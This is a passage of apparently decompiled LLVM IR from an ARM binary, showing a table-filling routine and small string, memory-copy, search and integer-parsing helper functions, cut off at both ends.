  %v0_f684 = load i32, i32* @r6, align 4
  store i32 %v0_f680, i32* @r5, align 4
  %v3_f690 = call i32 @function_f9ac(i32 %v0_f680, i32 ptrtoint (i32* @global_var_15c6c.309 to i32), i32 %v0_f684)
  %v0_f698 = load i32, i32* @sb, align 4
  store i32 %v0_f698, i32* @r0, align 4
  %v0_f69c = load i32, i32* @r6, align 4
  %v1_f69c = trunc i32 %v0_f69c to i16
  %v2_f69c = load i32, i32* @r4, align 4
  %v4_f69c = add i32 %v2_f69c, 316
  %v5_f69c = inttoptr i32 %v4_f69c to i16*
  store i16 %v1_f69c, i16* %v5_f69c, align 2
  %v0_f6a0 = load i32, i32* @r5, align 4
  store i32 %v0_f6a0, i32* @global_var_20754.310, align 4
  %v0_f6a4 = call i32 @function_11038()
  %v0_f6ac = load i32, i32* @sb, align 4
  store i32 %v0_f6a4, i32* @r5, align 4
  %v3_f6b4 = call i32 @function_f9ac(i32 %v0_f6a4, i32 ptrtoint (i32* @global_var_15c7c.312 to i32), i32 %v0_f6ac)
  store i32 19, i32* @r0, align 4
  %v0_f6c0 = load i32, i32* @sb, align 4
  %v1_f6c0 = trunc i32 %v0_f6c0 to i16
  %v2_f6c0 = load i32, i32* @r4, align 4
  %v4_f6c0 = add i32 %v2_f6c0, 324
  %v5_f6c0 = inttoptr i32 %v4_f6c0 to i16*
  store i16 %v1_f6c0, i16* %v5_f6c0, align 2
  %v0_f6c4 = load i32, i32* @r5, align 4
  store i32 %v0_f6c4, i32* @global_var_2075c.313, align 4
  %v0_f6c8 = call i32 @function_11038()
  store i32 %v0_f6c8, i32* @r5, align 4
  %v3_f6d8 = call i32 @function_f9ac(i32 %v0_f6c8, i32 ptrtoint (i32* @global_var_15c90.315 to i32), i32 19)
  %v0_f6e4 = load i32, i32* @sl, align 4
  store i32 %v0_f6e4, i32* @r0, align 4
  %v2_f6e8 = load i32, i32* @r4, align 4
  %v4_f6e8 = add i32 %v2_f6e8, 332
  %v5_f6e8 = inttoptr i32 %v4_f6e8 to i16*
  store i16 19, i16* %v5_f6e8, align 2
  %v0_f6ec = load i32, i32* @r5, align 4
  store i32 %v0_f6ec, i32* @global_var_20764.316, align 4
  %v0_f6f0 = call i32 @function_11038()
  %v0_f6f8 = load i32, i32* @sl, align 4
  store i32 %v0_f6f0, i32* @r5, align 4
  %v3_f700 = call i32 @function_f9ac(i32 %v0_f6f0, i32 ptrtoint (i32* @global_var_15ca4.318 to i32), i32 %v0_f6f8)
  %v0_f708 = load i32, i32* @fp, align 4
  store i32 %v0_f708, i32* @r0, align 4
  %v0_f70c = load i32, i32* @sl, align 4
  %v1_f70c = trunc i32 %v0_f70c to i16
  %v2_f70c = load i32, i32* @r4, align 4
  %v4_f70c = add i32 %v2_f70c, 340
  %v5_f70c = inttoptr i32 %v4_f70c to i16*
  store i16 %v1_f70c, i16* %v5_f70c, align 2
  %v0_f710 = load i32, i32* @r5, align 4
  store i32 %v0_f710, i32* @global_var_2076c.319, align 4
  %v0_f714 = call i32 @function_11038()
  %v0_f71c = load i32, i32* @fp, align 4
  store i32 %v0_f714, i32* @r5, align 4
  %v3_f724 = call i32 @function_f9ac(i32 %v0_f714, i32 ptrtoint (i32* @global_var_15be0.321 to i32), i32 %v0_f71c)
  %v0_f72c = load i32, i32* @r6, align 4
  store i32 %v0_f72c, i32* @r0, align 4
  %v0_f730 = load i32, i32* @fp, align 4
  %v1_f730 = trunc i32 %v0_f730 to i16
  %v2_f730 = load i32, i32* @r4, align 4
  %v4_f730 = add i32 %v2_f730, 348
  %v5_f730 = inttoptr i32 %v4_f730 to i16*
  store i16 %v1_f730, i16* %v5_f730, align 2
  %v0_f734 = load i32, i32* @r5, align 4
  store i32 %v0_f734, i32* @global_var_20774.322, align 4
  %v0_f738 = call i32 @function_11038()
  %v0_f73c = load i32, i32* @r6, align 4
  store i32 %v0_f738, i32* @r5, align 4
  %v3_f748 = call i32 @function_f9ac(i32 %v0_f738, i32 ptrtoint (i32* @global_var_15cb0.324 to i32), i32 %v0_f73c)
  store i32 18, i32* @r0, align 4
  %v0_f754 = load i32, i32* @r6, align 4
  %v1_f754 = trunc i32 %v0_f754 to i16
  %v2_f754 = load i32, i32* @r4, align 4
  %v4_f754 = add i32 %v2_f754, 356
  %v5_f754 = inttoptr i32 %v4_f754 to i16*
  store i16 %v1_f754, i16* %v5_f754, align 2
  %v0_f758 = load i32, i32* @r5, align 4
  store i32 %v0_f758, i32* @global_var_2077c.325, align 4
  %v0_f75c = call i32 @function_11038()
  store i32 %v0_f75c, i32* @r5, align 4
  %v3_f76c = call i32 @function_f9ac(i32 %v0_f75c, i32 ptrtoint (i32* @global_var_15cc0.327 to i32), i32 18)
  store i32 25, i32* @r0, align 4
  %v2_f77c = load i32, i32* @r4, align 4
  %v4_f77c = add i32 %v2_f77c, 364
  %v5_f77c = inttoptr i32 %v4_f77c to i16*
  store i16 18, i16* %v5_f77c, align 2
  %v0_f780 = load i32, i32* @r5, align 4
  store i32 %v0_f780, i32* @global_var_20784.328, align 4
  %v0_f784 = call i32 @function_11038()
  store i32 %v0_f784, i32* %r5.global-to-local, align 4
  %v3_f794 = call i32 @function_f9ac(i32 %v0_f784, i32 ptrtoint (i32* @global_var_15cd4.330 to i32), i32 25)
  store i32 111, i32* @r0, align 4
  %v2_f7a4 = load i32, i32* @r4, align 4
  %v4_f7a4 = add i32 %v2_f7a4, 372
  %v5_f7a4 = inttoptr i32 %v4_f7a4 to i16*
  store i16 25, i16* %v5_f7a4, align 2
  %v0_f7a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_f7a8, i32* @global_var_2078c.331, align 4
  %v0_f7ac = load i32, i32* @r0, align 4
  store i32 %v0_f7ac, i32* @r5, align 4
  %v0_f7b0 = call i32 @function_11038()
  %v0_f7b4 = load i32, i32* @r5, align 4
  store i32 %v0_f7b0, i32* @r6, align 4
  %v3_f7c0 = call i32 @function_f9ac(i32 %v0_f7b0, i32 ptrtoint (i32* @global_var_15dac.333 to i32), i32 %v0_f7b4)
  %v0_f7c8 = load i32, i32* @r5, align 4
  store i32 %v0_f7c8, i32* @r0, align 4
  %v1_f7cc = trunc i32 %v0_f7c8 to i16
  %v2_f7cc = load i32, i32* @r4, align 4
  %v4_f7cc = add i32 %v2_f7cc, 380
  %v5_f7cc = inttoptr i32 %v4_f7cc to i16*
  store i16 %v1_f7cc, i16* %v5_f7cc, align 2
  %v0_f7d0 = load i32, i32* @r6, align 4
  store i32 %v0_f7d0, i32* @global_var_20794.334, align 4
  %v0_f7d4 = call i32 @function_11038()
  %v0_f7d8 = load i32, i32* @r5, align 4
  store i32 %v0_f7d4, i32* @r6, align 4
  %v3_f7e4 = call i32 @function_f9ac(i32 %v0_f7d4, i32 ptrtoint (i32* @global_var_15e1c.336 to i32), i32 %v0_f7d8)
  store i32 110, i32* @r0, align 4
  %v0_f7f0 = load i32, i32* @r5, align 4
  %v1_f7f0 = trunc i32 %v0_f7f0 to i16
  %v2_f7f0 = load i32, i32* @r4, align 4
  %v4_f7f0 = add i32 %v2_f7f0, 388
  %v5_f7f0 = inttoptr i32 %v4_f7f0 to i16*
  store i16 %v1_f7f0, i16* %v5_f7f0, align 2
  %v0_f7f4 = load i32, i32* @r6, align 4
  store i32 %v0_f7f4, i32* @global_var_2079c.337, align 4
  %v0_f7f8 = load i32, i32* @r0, align 4
  store i32 %v0_f7f8, i32* @r5, align 4
  %v0_f7fc = call i32 @function_11038()
  %v0_f800 = load i32, i32* @r5, align 4
  store i32 %v0_f7fc, i32* @r6, align 4
  %v3_f80c = call i32 @function_f9ac(i32 %v0_f7fc, i32 ptrtoint (i32* @global_var_15e8c.339 to i32), i32 %v0_f800)
  %v0_f814 = load i32, i32* @r5, align 4
  store i32 %v0_f814, i32* @r0, align 4
  %v1_f818 = trunc i32 %v0_f814 to i16
  %v2_f818 = load i32, i32* @r4, align 4
  %v4_f818 = add i32 %v2_f818, 396
  %v5_f818 = inttoptr i32 %v4_f818 to i16*
  store i16 %v1_f818, i16* %v5_f818, align 2
  %v0_f81c = load i32, i32* @r6, align 4
  store i32 %v0_f81c, i32* @global_var_207a4.340, align 4
  %v0_f820 = call i32 @function_11038()
  %v0_f824 = load i32, i32* @r5, align 4
  store i32 %v0_f820, i32* @r6, align 4
  %v3_f830 = call i32 @function_f9ac(i32 %v0_f820, i32 ptrtoint (i32* @global_var_15efc.342 to i32), i32 %v0_f824)
  store i32 117, i32* @r0, align 4
  %v0_f83c = load i32, i32* @r5, align 4
  %v1_f83c = trunc i32 %v0_f83c to i16
  %v2_f83c = load i32, i32* @r4, align 4
  %v4_f83c = add i32 %v2_f83c, 404
  %v5_f83c = inttoptr i32 %v4_f83c to i16*
  store i16 %v1_f83c, i16* %v5_f83c, align 2
  %v0_f840 = load i32, i32* @r6, align 4
  store i32 %v0_f840, i32* @global_var_207ac.343, align 4
  %v0_f844 = call i32 @function_11038()
  store i32 %v0_f844, i32* %r5.global-to-local, align 4
  %v3_f854 = call i32 @function_f9ac(i32 %v0_f844, i32 ptrtoint (i32* @global_var_15f6c.345 to i32), i32 117)
  store i32 %v0_f844, i32* @global_var_207b4.346, align 4
  %v2_f864 = load i32, i32* @r4, align 4
  %v4_f864 = add i32 %v2_f864, 412
  %v5_f864 = inttoptr i32 %v4_f864 to i16*
  store i16 117, i16* %v5_f864, align 2
  store i32 %v6_f14c, i32* %r5.global-to-local, align 4
  ret i32 %v3_f854

; uselistorder directives
  uselistorder i32 %v0_f820, { 1, 0 }
  uselistorder i32 %v0_f7fc, { 1, 0 }
  uselistorder i32 %v0_f7d4, { 1, 0 }
  uselistorder i32 %v0_f7b0, { 1, 0 }
  uselistorder i32 %v0_f738, { 1, 0 }
  uselistorder i32 %v0_f714, { 1, 0 }
  uselistorder i32 %v0_f6f0, { 1, 0 }
  uselistorder i32 %v0_f6a4, { 1, 0 }
  uselistorder i32 %v0_f680, { 1, 0 }
  uselistorder i32 %v0_f65c, { 1, 0 }
  uselistorder i32 %v0_f638, { 1, 0 }
  uselistorder i32 %v0_f614, { 1, 0 }
  uselistorder i32 %v0_f550, { 1, 0 }
  uselistorder i32 %v0_f410, { 1, 0 }
  uselistorder i32 %v0_f3f0, { 1, 0 }
  uselistorder i32 %v0_f3ac, { 1, 0 }
  uselistorder i32 %v0_f38c, { 1, 0 }
  uselistorder i32 %v0_f348, { 1, 0 }
  uselistorder i32 %v0_f328, { 1, 0 }
  uselistorder i32 %v0_f2e0, { 1, 0 }
  uselistorder i32 %v0_f2c0, { 1, 0 }
  uselistorder i32 %v0_f278, { 1, 0 }
  uselistorder i32 %v0_f230, { 1, 0 }
  uselistorder i32 %v0_f1e8, { 1, 0 }
  uselistorder i32 %v0_f1c8, { 1, 0 }
  uselistorder i32 %v0_f1a8, { 1, 0 }
  uselistorder i32 %v0_f184, { 1, 0 }
  uselistorder i32 %v0_f158, { 1, 0 }
  uselistorder i32 21, { 1, 2, 0, 3 }
  uselistorder i32 29, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @function_f9ac, { 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_2061c.163 to i32), { 4, 0, 1, 2, 3 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @function_f93c(i8* %arg1) local_unnamed_addr {
dec_label_pc_f93c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_f940 = load i8, i8* %arg1, align 1
  %v2_f944 = icmp eq i8 %v3_f940, 0
  %v0_f948 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_f944, i32 %v0_f948)
  br label %dec_label_pc_f950

dec_label_pc_f950:                                ; preds = %dec_label_pc_f950, %dec_label_pc_f93c
  %v0_f950 = phi i32 [ %v1_f950, %dec_label_pc_f950 ], [ 0, %dec_label_pc_f93c ]
  %v1_f950 = add i32 %v0_f950, 1
  %v2_f954 = add i32 %v1_f950, %tmp
  %v3_f954 = inttoptr i32 %v2_f954 to i8*
  %v4_f954 = load i8, i8* %v3_f954, align 1
  %v6_f954 = zext i8 %v4_f954 to i32
  store i32 %v6_f954, i32* @r3, align 4
  %v2_f958 = icmp eq i8 %v4_f954, 0
  br i1 %v2_f958, label %dec_label_pc_f960, label %dec_label_pc_f950

dec_label_pc_f960:                                ; preds = %dec_label_pc_f950
  ret i32 %v1_f950
}

define i32 @function_f964(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f964:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_f964 = load i8, i8* %arg1, align 1
  %v3_f964 = zext i8 %v2_f964 to i32
  store i32 %v3_f964, i32* @r2, align 4
  %v2_f968 = icmp eq i8 %v2_f964, 0
  br i1 %v2_f968, label %bb, label %dec_label_pc_f974

bb:                                               ; preds = %dec_label_pc_f964
  store i32 %v3_f964, i32* @ip, align 4
  br label %dec_label_pc_f988

dec_label_pc_f974:                                ; preds = %dec_label_pc_f964
  br label %dec_label_pc_f978

dec_label_pc_f978:                                ; preds = %dec_label_pc_f978, %dec_label_pc_f974
  %v0_f978 = phi i32 [ %v1_f978, %dec_label_pc_f978 ], [ 0, %dec_label_pc_f974 ]
  %v1_f978 = add i32 %v0_f978, 1
  store i32 %v1_f978, i32* @ip, align 4
  %v2_f97c = add i32 %v1_f978, %tmp
  %v3_f97c = inttoptr i32 %v2_f97c to i8*
  %v4_f97c = load i8, i8* %v3_f97c, align 1
  %v2_f980 = icmp eq i8 %v4_f97c, 0
  br i1 %v2_f980, label %dec_label_pc_f988, label %dec_label_pc_f978

dec_label_pc_f988:                                ; preds = %dec_label_pc_f978, %bb
  %v0_f988 = phi i32 [ %v3_f964, %bb ], [ %v1_f978, %dec_label_pc_f978 ]
  br label %dec_label_pc_f994

dec_label_pc_f990:                                ; preds = %dec_label_pc_f994
  %v0_f990 = load i32, i32* %r1.global-to-local, align 4
  %v1_f990 = add i32 %v0_f990, 1
  %v2_f990 = inttoptr i32 %v1_f990 to i8*
  %v3_f990 = load i8, i8* %v2_f990, align 1
  %v4_f990 = zext i8 %v3_f990 to i32
  store i32 %v4_f990, i32* @r2, align 4
  store i32 %v1_f990, i32* %r1.global-to-local, align 4
  %v0_f994.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_f994

dec_label_pc_f994:                                ; preds = %dec_label_pc_f988, %dec_label_pc_f990
  %v0_f99c.off0 = phi i8 [ %v2_f964, %dec_label_pc_f988 ], [ %v3_f990, %dec_label_pc_f990 ]
  %v0_f994 = phi i32 [ %v0_f988, %dec_label_pc_f988 ], [ %v0_f994.pr, %dec_label_pc_f990 ]
  %v1_f994 = add i32 %v0_f994, -1
  store i32 %v1_f994, i32* @r3, align 4
  %v3_f998 = icmp eq i32 %v0_f994, 0
  %v2_f99c = load i32, i32* @r0, align 4
  %v3_f99c = inttoptr i32 %v2_f99c to i8*
  store i8 %v0_f99c.off0, i8* %v3_f99c, align 1
  %v4_f99c = load i32, i32* @r0, align 4
  %v5_f99c = add i32 %v4_f99c, 1
  store i32 %v5_f99c, i32* @r0, align 4
  br i1 %v3_f998, label %dec_label_pc_f9a4, label %dec_label_pc_f990

dec_label_pc_f9a4:                                ; preds = %dec_label_pc_f994
  %v0_f9a4 = load i32, i32* @ip, align 4
  ret i32 %v0_f9a4

; uselistorder directives
  uselistorder i32 %v0_f994, { 1, 0 }
  uselistorder i32 %v1_f978, { 0, 1, 3, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f994, { 1, 0 }
}

define i32 @function_f9ac(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f9ac:
  %v2_f9ac = icmp eq i32 %arg3, 0
  %v0_f9b0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_f9ac, i32 %v0_f9b0)
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_f9b8

dec_label_pc_f9b8:                                ; preds = %dec_label_pc_f9b8, %dec_label_pc_f9ac
  %v0_f9b8 = phi i32 [ %v1_f9c0, %dec_label_pc_f9b8 ], [ 0, %dec_label_pc_f9ac ]
  %v2_f9b8 = add i32 %v0_f9b8, %arg2
  %v3_f9b8 = inttoptr i32 %v2_f9b8 to i8*
  %v4_f9b8 = load i8, i8* %v3_f9b8, align 1
  %v4_f9bc = add i32 %v0_f9b8, %arg1
  %v5_f9bc = inttoptr i32 %v4_f9bc to i8*
  store i8 %v4_f9b8, i8* %v5_f9bc, align 1
  %v0_f9c0 = load i32, i32* @ip, align 4
  %v1_f9c0 = add i32 %v0_f9c0, 1
  store i32 %v1_f9c0, i32* @ip, align 4
  %v9_f9c4 = icmp eq i32 %v1_f9c0, %arg3
  br i1 %v9_f9c4, label %dec_label_pc_f9cc, label %dec_label_pc_f9b8

dec_label_pc_f9cc:                                ; preds = %dec_label_pc_f9b8
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_f9c0, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_f9d0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f9d0:
  %r2.global-to-local = alloca i32, align 4
  %v2_f9d0 = icmp eq i32 %arg2, 0
  %v0_f9d4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_f9d0, i32 %v0_f9d4)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f9dc

dec_label_pc_f9dc:                                ; preds = %dec_label_pc_f9dc, %dec_label_pc_f9d0
  %v2_f9e0 = phi i32 [ %v1_f9e4, %dec_label_pc_f9dc ], [ 0, %dec_label_pc_f9d0 ]
  %v4_f9e0 = add i32 %v2_f9e0, %arg1
  %v5_f9e0 = inttoptr i32 %v4_f9e0 to i8*
  store i8 0, i8* %v5_f9e0, align 1
  %v0_f9e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_f9e4 = add i32 %v0_f9e4, 1
  store i32 %v1_f9e4, i32* %r2.global-to-local, align 4
  %v9_f9e8 = icmp eq i32 %v1_f9e4, %arg2
  br i1 %v9_f9e8, label %dec_label_pc_f9f0, label %dec_label_pc_f9dc

dec_label_pc_f9f0:                                ; preds = %dec_label_pc_f9dc
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_f9e4, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_f9f4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_f9f4:
  %v7_fa08 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_fa08, label %dec_label_pc_fa10, label %dec_label_pc_fa18

dec_label_pc_fa10:                                ; preds = %dec_label_pc_fa2c, %dec_label_pc_fa18, %dec_label_pc_f9f4, %dec_label_pc_fa58
  %storemerge = phi i32 [ %v1_fa58, %dec_label_pc_fa58 ], [ -1, %dec_label_pc_f9f4 ], [ -1, %dec_label_pc_fa18 ], [ -1, %dec_label_pc_fa2c ]
  ret i32 %storemerge

dec_label_pc_fa18:                                ; preds = %dec_label_pc_f9f4
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_fa10, label %dec_label_pc_fa20

dec_label_pc_fa20:                                ; preds = %dec_label_pc_fa18
  br label %dec_label_pc_fa38

dec_label_pc_fa2c:                                ; preds = %bb, %dec_label_pc_fa4c
  %v1_fa383 = phi i32 [ %v1_fa4c, %dec_label_pc_fa4c ], [ 0, %bb ]
  %v1_fa2c = add i32 %v0_fa58, 1
  %v9_fa30 = icmp eq i32 %v1_fa2c, %arg2
  br i1 %v9_fa30, label %dec_label_pc_fa10, label %dec_label_pc_fa38

dec_label_pc_fa38:                                ; preds = %dec_label_pc_fa2c, %dec_label_pc_fa20
  %v0_fa58 = phi i32 [ %v1_fa2c, %dec_label_pc_fa2c ], [ 0, %dec_label_pc_fa20 ]
  %v1_fa38 = phi i32 [ %v1_fa383, %dec_label_pc_fa2c ], [ 0, %dec_label_pc_fa20 ]
  %v2_fa38 = add i32 %v1_fa38, %arg3
  %v3_fa38 = inttoptr i32 %v2_fa38 to i8*
  %v4_fa38 = load i8, i8* %v3_fa38, align 1
  %v2_fa3c = add i32 %v0_fa58, %arg1
  %v3_fa3c = inttoptr i32 %v2_fa3c to i8*
  %v4_fa3c = load i8, i8* %v3_fa3c, align 1
  %v9_fa40 = icmp eq i8 %v4_fa3c, %v4_fa38
  br i1 %v9_fa40, label %dec_label_pc_fa4c, label %bb

bb:                                               ; preds = %dec_label_pc_fa38
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_fa2c

dec_label_pc_fa4c:                                ; preds = %dec_label_pc_fa38
  %v1_fa4c = add i32 %v1_fa38, 1
  store i32 %v1_fa4c, i32* @ip, align 4
  %v9_fa50 = icmp eq i32 %v1_fa4c, %arg4
  br i1 %v9_fa50, label %dec_label_pc_fa58, label %dec_label_pc_fa2c

dec_label_pc_fa58:                                ; preds = %dec_label_pc_fa4c
  %v1_fa58 = add i32 %v0_fa58, 1
  br label %dec_label_pc_fa10

; uselistorder directives
  uselistorder i32 %v1_fa4c, { 1, 2, 0 }
  uselistorder i32 %v1_fa38, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fa2c, { 1, 0 }
  uselistorder label %dec_label_pc_fa10, { 3, 0, 1, 2 }
}

define i32 @function_fa60(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_fa60:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_fa60 = load i32, i32* @r4, align 4
  %v12_fa60 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fa70

dec_label_pc_fa70:                                ; preds = %.thread, %dec_label_pc_fa84, %bb, %dec_label_pc_fa60
  %v0_fa70 = phi i32 [ %tmp, %dec_label_pc_fa60 ], [ %v5_fa70, %bb ], [ %v5_fa70, %dec_label_pc_fa84 ], [ %v5_fa70, %.thread ]
  %v1_fa70 = inttoptr i32 %v0_fa70 to i8*
  %v2_fa70 = load i8, i8* %v1_fa70, align 1
  %v5_fa70 = add i32 %v0_fa70, 1
  store i32 %v5_fa70, i32* %r5.global-to-local, align 4
  %v7_fa74 = icmp eq i8 %v2_fa70, 9
  br i1 %v7_fa74, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_fa70
  br label %dec_label_pc_fa70

bb:                                               ; preds = %dec_label_pc_fa70
  %v3_fa70 = zext i8 %v2_fa70 to i32
  %v8_fa78 = icmp eq i8 %v2_fa70, 32
  store i32 %v3_fa70, i32* @r4, align 4
  br i1 %v8_fa78, label %dec_label_pc_fa70, label %dec_label_pc_fa84

dec_label_pc_fa84:                                ; preds = %bb
  %v7_fa84 = icmp eq i8 %v2_fa70, 10
  br i1 %v7_fa84, label %dec_label_pc_fa70, label %dec_label_pc_fa8c

dec_label_pc_fa8c:                                ; preds = %dec_label_pc_fa84
  %v7_fa8c = icmp eq i8 %v2_fa70, 45
  br i1 %v7_fa8c, label %dec_label_pc_fb7c, label %dec_label_pc_fa94

dec_label_pc_fa94:                                ; preds = %dec_label_pc_fa8c
  %v7_fa94 = icmp eq i8 %v2_fa70, 43
  br i1 %v7_fa94, label %bb44, label %dec_label_pc_faa4

bb44:                                             ; preds = %dec_label_pc_fa94
  %v2_fa98 = inttoptr i32 %v5_fa70 to i8*
  %v3_fa98 = load i8, i8* %v2_fa98, align 1
  %v4_fa98 = zext i8 %v3_fa98 to i32
  store i32 %v4_fa98, i32* @r4, align 4
  %v6_fa98 = add i32 %v0_fa70, 2
  store i32 %v6_fa98, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_faa4

dec_label_pc_faa4:                                ; preds = %bb44, %dec_label_pc_fa94, %dec_label_pc_fb7c
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_fb7c ], [ 2147483647, %dec_label_pc_fa94 ], [ 2147483647, %bb44 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_fb7c ], [ 0, %dec_label_pc_fa94 ], [ 0, %bb44 ]
  store i32 %storemerge1, i32* @r7, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_faac = call i32 @function_10028(i32 %storemerge1, i32 %arg2)
  %v0_fab0 = load i32, i32* @r7, align 4
  store i32 %v0_fab0, i32* @r0, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  %v0_fab8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_fab8, i32* @r1, align 4
  %v0_fabc = call i32 @function_ff2c()
  store i32 0, i32* @ip, align 4
  %v0_facc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_facc.outer

dec_label_pc_facc.outer:                          ; preds = %.thread5, %dec_label_pc_faa4
  %v2_fb48.ph = phi i32 [ %v5_fb48, %.thread5 ], [ 0, %dec_label_pc_faa4 ]
  %v1_fb0c.ph = phi i32 [ %v4_fb4c, %.thread5 ], [ %v0_facc.pre, %dec_label_pc_faa4 ]
  %v1_fb24.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_faa4 ]
  %v3_fb18 = icmp uge i32 %v2_fb48.ph, %v0_fabc
  %v9_fb18 = icmp eq i32 %v2_fb48.ph, %v0_fabc
  %v2_fb1c = xor i1 %v3_fb18, true
  %v3_fb1c = or i1 %v9_fb18, %v2_fb1c
  %v2_fb20 = xor i1 %v9_fb18, true
  %v3_fb20 = and i1 %v3_fb18, %v2_fb20
  %v2_fb40 = icmp eq i1 %v9_fb18, false
  br label %dec_label_pc_facc

dec_label_pc_facc:                                ; preds = %dec_label_pc_facc.outer, %dec_label_pc_fb54
  %v1_fb24 = phi i32 [ -1, %dec_label_pc_fb54 ], [ %v1_fb24.ph, %dec_label_pc_facc.outer ]
  %v1_fb0c = phi i32 [ %v3_fb54, %dec_label_pc_fb54 ], [ %v1_fb0c.ph, %dec_label_pc_facc.outer ]
  %v1_facc = urem i32 %v1_fb0c, 256
  %v1_fad0 = add nsw i32 %v1_facc, -48
  %v1_fad8 = add nsw i32 %v1_facc, -97
  %v1_fadc = add i32 %v1_fb0c, -48
  %v1_fae0 = add nsw i32 %v1_facc, -65
  %tmp75 = icmp ult i32 %v1_fad0, 10
  br i1 %tmp75, label %dec_label_pc_fb10, label %dec_label_pc_fae8

dec_label_pc_fae8:                                ; preds = %dec_label_pc_facc
  %v2_fae8 = icmp ugt i32 %v1_fae0, 24
  %v7_fae8 = icmp eq i32 %v1_fae0, 25
  %v2_faec = xor i1 %v7_fae8, true
  %v3_faec = and i1 %v2_fae8, %v2_faec
  br i1 %v3_faec, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_fae8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_fae8, %bb45
  %v0_fb0014 = phi i32 [ %v1_fadc, %dec_label_pc_fae8 ], [ 0, %bb45 ]
  %v2_faf0 = xor i1 %v2_fae8, true
  %v3_faf0 = or i1 %v7_fae8, %v2_faf0
  br i1 %v3_faf0, label %bb47, label %bb48

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_fb00 = phi i32 [ %v0_fb0014, %bb46 ], [ 1, %bb47 ]
  br i1 %v3_faec, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  %v6_faf8 = icmp ugt i32 %v1_fad8, 24
  %v11_faf8 = icmp eq i32 %v1_fad8, 25
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_fafc = phi i1 [ %v7_fae8, %bb48 ], [ %v11_faf8, %bb49 ]
  %v0_fafc = phi i1 [ %v2_fae8, %bb48 ], [ %v6_faf8, %bb49 ]
  %v2_fafc = xor i1 %v1_fafc, true
  %v3_fafc = and i1 %v0_fafc, %v2_fafc
  br i1 %v3_fafc, label %dec_label_pc_fb60, label %dec_label_pc_fb00

dec_label_pc_fb00:                                ; preds = %bb50
  %v2_fb00 = icmp eq i32 %v0_fb00, 0
  %. = select i1 %v2_fb00, i32 87, i32 55
  %v2_fb0c = sub i32 %v1_fb0c, %.
  br label %dec_label_pc_fb10

dec_label_pc_fb10:                                ; preds = %dec_label_pc_facc, %dec_label_pc_fb00
  %v0_fb2429 = phi i32 [ %v1_fae0, %dec_label_pc_facc ], [ %., %dec_label_pc_fb00 ]
  %v3_fb48 = phi i32 [ %v1_fadc, %dec_label_pc_facc ], [ %v2_fb0c, %dec_label_pc_fb00 ]
  %v1_fb10 = load i32, i32* %r6.global-to-local, align 4
  %v2_fb10 = sub i32 %v3_fb48, %v1_fb10
  %v4_fb10 = xor i32 %v1_fb10, %v3_fb48
  %v5_fb10 = xor i32 %v2_fb10, %v3_fb48
  %v6_fb10 = and i32 %v5_fb10, %v4_fb10
  %v7_fb10 = icmp slt i32 %v6_fb10, 0
  %v8_fb10 = icmp slt i32 %v2_fb10, 0
  %v2_fb14 = xor i1 %v8_fb10, %v7_fb10
  br i1 %v2_fb14, label %dec_label_pc_fb18, label %dec_label_pc_fb60

dec_label_pc_fb18:                                ; preds = %dec_label_pc_fb10
  br i1 %v3_fb1c, label %bb53, label %bb54

